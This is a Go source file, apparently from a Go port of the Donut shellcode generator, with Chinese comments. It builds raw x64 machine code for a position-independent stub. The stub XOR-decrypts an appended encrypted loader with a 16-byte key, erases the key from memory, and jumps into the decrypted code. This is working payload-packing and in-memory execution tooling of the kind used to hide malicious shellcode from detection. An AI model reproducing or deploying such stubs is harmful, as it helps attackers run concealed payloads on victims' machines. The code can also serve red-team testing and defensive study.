package gonut

import (
	"bytes"
	"encoding/binary"
)

// assembleX64LoaderDecryptStub 生成 x64 PIC 解密 stub：保留 RCX(instance)，解密 loader、擦 key、jmp 执行。
// 使用 lea rax,[rip+0] 取基址，避免 call/pop 在 Donut align 块之后额外压栈导致 loader 栈帧错位。
// 布局：[stub code][key 16][encrypted loader]（encrypted loader 由 BuildLoader 单独追加）。
func assembleX64LoaderDecryptStub(loaderLen int, key []byte) []byte {
	if len(key) != picLoaderKeyLen {
		panic("loader PIC key must be 16 bytes")
	}
	var b bytes.Buffer
	// mov r9, rcx — 保存 instance（49 89 C9；勿用 4C 89 C8=mov rax,r9）
	b.Write([]byte{0x49, 0x89, 0xC9})
	// lea rax, [rip+0] — rax = 下一条指令地址（PIC 基址锚点）
	leaRaxPos := b.Len()
	b.Write([]byte{0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00})

	leaR10Pos := b.Len()
	b.Write([]byte{0x4C, 0x8D, 0x90, 0, 0, 0, 0}) // lea r10, [rax+imm32]
	b.Write([]byte{0x4C, 0x89, 0xD7})             // mov rdi, r10

	leaRsiPos := b.Len()
	b.Write([]byte{0x48, 0x8D, 0xB0, 0, 0, 0, 0}) // lea rsi, [rax+disp32]

	b.WriteByte(0xB9)
	_ = binary.Write(&b, binary.LittleEndian, uint32(loaderLen))
	b.Write([]byte{0x31, 0xD2}) // xor edx, edx

	loopStart := b.Len()
	b.Write([]byte{
		0x8A, 0x07,
		0x32, 0x04, 0x16,
		0x88, 0x07,
		0x48, 0xFF, 0xC7,
		0xFE, 0xC2,
		0x80, 0xE2, 0x0F,
		0x48, 0xFF, 0xC9,
	})
	rel := int8(loopStart - (b.Len() + 2))
	b.Write([]byte{0x75, byte(rel)})

	// 擦除 key：mov rdi, rsi; xor eax, eax; mov ecx, 16; rep stosb
	b.Write([]byte{
		0x48, 0x89, 0xF7,
		0x31, 0xC0,
		0xB9, 0x10, 0x00, 0x00, 0x00,
		0xF3, 0xAA,
	})

	b.Write([]byte{0x4C, 0x89, 0xC9}) // mov rcx, r9
	b.Write([]byte{0x41, 0xFF, 0xE2}) // jmp r10

	code := b.Bytes()
	keyStart := len(code)
	loaderStart := keyStart + len(key)
	raxAnchor := leaRaxPos + 7 // RIP after lea rax,[rip+0]

	binary.LittleEndian.PutUint32(code[leaR10Pos+3:], uint32(loaderStart-raxAnchor))
	binary.LittleEndian.PutUint32(code[leaRsiPos+3:], uint32(keyStart-raxAnchor))

	return append(code, key...)
}
